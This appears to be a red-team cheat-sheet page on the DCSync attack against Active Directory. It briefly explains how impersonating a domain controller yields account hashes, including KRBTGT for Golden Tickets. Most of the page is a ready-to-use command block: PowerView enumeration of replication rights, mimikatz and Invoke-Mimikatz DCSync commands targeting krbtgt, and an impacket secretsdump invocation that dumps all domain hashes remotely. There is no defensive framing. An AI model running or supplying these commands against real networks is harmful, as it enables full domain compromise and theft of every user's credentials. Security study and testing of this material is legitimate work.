# DCSync

<details>

<summary>What is the DCSync attack ?</summary>

This attack simulates the **behavior** of a **domain controller** and **asks other domain controllers to replicate information** using the **Directory Replication Service Remote Protocol** (MS-DRSR). Basically, it lets you **pretend to be a domain controller** and ask for user password data. This can be used by attackers to get any account’s NTLM hash including the KRBTGT account, which enables attackers to create **Golden Tickets.**

The only pre-requisite to worry about is that you have an account with **rights** to perform **domain replication**. This is controlled by the Replicating Changes permissions set on the domain.

</details>

## Attack

<pre class="language-powershell"><code class="lang-powershell">'''
WINDOWS - locally
'''
# enumerate users with the required privileges
Get-ObjectACL "DC=security,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
}
<strong># or
</strong>Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

# Take the SID and attempt to identify the UPN : 
Get-ADUser -Identity S-1-5-21-2543357152-2466851693-2862170513-1121
Get-ADGroup -Identity S-1-5-21-2543357152-2466851693-2862170513-527

# if OK, mimikatz :
lsadump::dcsync /domain:fcorp.local /user:krbtgt
# or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
# note : the user that has dcsync priv

'''
LINUX - remotely
'''
# user with dcsync
secretsdump.py -just-dc $user:$passwd@$ip -outputfile dcsync_hashes
</code></pre>
